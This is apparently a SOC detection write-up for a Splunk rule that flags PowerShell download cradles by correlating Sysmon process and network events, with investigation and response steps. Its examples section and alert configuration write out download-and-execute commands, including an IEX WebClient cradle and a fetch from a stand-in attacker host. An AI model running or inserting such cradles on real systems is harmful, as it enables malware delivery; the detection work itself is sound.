# Suspicious PowerShell Activity - Download Cradle and Network Communication Detected

## Detection Metadata

| Field | Value |
|---|---|
| Detection Type | Command Execution / Defense Evasion |
| Platform | Windows |
| Data Source | Sysmon |
| Event IDs | Event ID 1 - Process Creation / Event ID 3 - Network Connection |
| Severity | High |
| MITRE ATT&CK | T1059.001 - PowerShell |
| Related Technique | T1105 - Ingress Tool Transfer |
| Schedule | Every 5 minutes |
| Alert Type | Behavioral Correlation Detection |
| Status | Validated |

---

# Overview

This detection identifies suspicious PowerShell activity involving:

- Download cradles
- Remote payload retrieval
- External network communication
- Script-based execution
- File downloads through PowerShell

Attackers frequently abuse PowerShell because it is:

- Built into Windows
- Trusted by the operating system
- Capable of downloading and executing code
- Commonly allowed in enterprise environments

---

# Detection Objective

The goal of this detection is to identify malicious PowerShell behavior including:

- Downloading files from remote servers
- Executing scripts from the internet
- PowerShell-based malware delivery
- Command-and-control preparation
- Living-off-the-land techniques

The detection correlates:

```
PowerShell Execution

        +

Suspicious Command Arguments

        +

Network Communication
```

---

# Attack Scenario

During the Windows attack simulation, PowerShell was used as part of the payload delivery stage.

Attack flow:

```
Windows Endpoint

        |

PowerShell Execution

        |

Payload Download

        |

Outbound Connection

        |

Malicious File Delivered

        |

Splunk Alert Triggered
```

---

# Data Sources

## Sysmon Event ID 1

Process Creation provides:

- Process name
- Command line arguments
- User context
- Parent process
- Execution path

---

## Sysmon Event ID 3

Network Connection provides:

- Destination IP
- Destination port
- Network communication timeline

---

Collected through:

```
Windows Endpoint

        |

Splunk Universal Forwarder

        |

Splunk Enterprise
```

Index:

```
wineventlog
```

---

# SPL Detection

```spl
index=wineventlog (EventCode=1 OR EventCode=3) (Image="*\\powershell.exe" OR Image="*\\pwsh.exe")
| eval Process_Key = coalesce(ProcessGuid, ProcessId)
| eval Internal_IP = coalesce(SourceIp, SourceAddress, src_ip, c_ip)
| eval Remote_IP = coalesce(DestinationIp, DestinationAddress, dest_ip, d_ip)
| eval Remote_Port = coalesce(DestinationPort, dest_port, d_port)
| stats 
    min(_time) as Execution_Epoch
    max(_time) as Detection_Epoch
    values(Computer) as "Target Host"
    values(User) as "Executing User"
    values(Image) as "PowerShell Path"
    values(CommandLine) as "Full Command"
    values(Internal_IP) as "Local IP"
    values(Remote_IP) as "Outbound Destination IP"
    values(Remote_Port) as "Outbound Destination Port"
    by Process_Key
| where match('Full Command', "(?i)(Invoke-WebRequest|iwr|DownloadFile|DownloadString|UploadFile|WebRequest|Net\.WebClient|HttpClient|curl|wget)")
| eval "Execution Time" = strftime(Execution_Epoch, "%Y-%m-%d %H:%M:%S")
| eval "Detection Time" = strftime(Detection_Epoch, "%Y-%m-%d %H:%M:%S")
| table "Execution Time", "Detection Time", "Target Host", "Executing User", "PowerShell Path", "Full Command", "Local IP", "Outbound Destination IP", "Outbound Destination Port"
```

---

# Detection Logic Explanation

## 1. Identify PowerShell Execution

The detection monitors:

```
powershell.exe

pwsh.exe
```

These are legitimate administrative tools but are frequently abused by attackers.

---

## 2. Detect Suspicious Download Commands

The query searches for:

```
Invoke-WebRequest

iwr

DownloadFile

DownloadString

Net.WebClient

HttpClient

curl

wget
```

These commands are commonly used to retrieve payloads.

---

## 3. Correlate Network Communication

The detection links:

```
PowerShell Process Creation

        +

Outbound Network Connection
```

This helps identify active download activity instead of harmless PowerShell usage.

---

# Suspicious Examples

## Download Cradle

Example:

```
powershell.exe -c Invoke-WebRequest http://192.168.50.40/payload.exe -OutFile payload.exe
```

---

## Remote Script Execution

Example:

```
powershell.exe -c IEX(New-Object Net.WebClient).DownloadString(...)
```

---

## External Communication

Example:

```
PowerShell

        |

Outbound TCP Connection

        |

Remote Server
```

---

# Alert Configuration

## Severity

```
High
```

---

## Trigger Condition

The alert triggers when:

1. PowerShell executes on a monitored endpoint

AND

2. The command line contains download or remote execution behavior

AND

3. Network communication is observed

Example:

```
Process:

powershell.exe


Command:

Invoke-WebRequest http://attacker.com/tool.exe
```

---

## Schedule

```
Every 5 minutes
```

---

# Investigation Guidance

When this alert triggers:

---

# 1. Review PowerShell Command Line

Analyze:

```
Full Command
```

Look for:

- Download URLs
- Encoded commands
- File paths
- Execution arguments

---

# 2. Investigate User Context

Review:

```
Executing User
```

Determine:

- User legitimacy
- Privilege level
- Recent authentication events

---

# 3. Investigate Destination

Review:

```
Outbound Destination IP

Outbound Destination Port
```

Determine:

- Internal or external destination
- Reputation
- Related alerts

---

# 4. Review Parent Process

Investigate:

```
Parent Process
```

Suspicious parents:

```
winword.exe

excel.exe

wscript.exe

cmd.exe

explorer.exe
```

---

# Incident Response Actions

Recommended actions:

- Isolate affected endpoint
- Stop malicious PowerShell process
- Block malicious destination
- Remove downloaded payload
- Perform malware analysis
- Search for additional PowerShell activity
- Review persistence mechanisms

---

# False Positives

Possible legitimate activity:

- System administrators
- Software deployment tools
- Automation scripts
- Patch management systems

Validation should consider:

- User identity
- Script purpose
- Destination reputation
- File reputation

---

# Validation

This detection was validated during the Windows Attack Simulation.

Technique:

```
MITRE ATT&CK

T1059.001 - PowerShell

T1105 - Ingress Tool Transfer
```

Simulation:

```
Attacker System

        |

PowerShell Payload Delivery

        |

Windows Endpoint

        |

Sysmon Process + Network Events

        |

Splunk Alert Triggered
```

Result:

```
Detection Triggered Successfully
```

---

# Related Playbooks

```
incident-response/playbooks/suspicious-powershell.md

incident-response/playbooks/malware-investigation.md

incident-response/playbooks/data-exfiltration.md
```

---

# Lessons Learned

PowerShell is one of the most commonly abused Windows administrative tools.

Monitoring command-line behavior combined with network telemetry allows SOC analysts to distinguish normal administrative activity from malicious download and execution behavior.
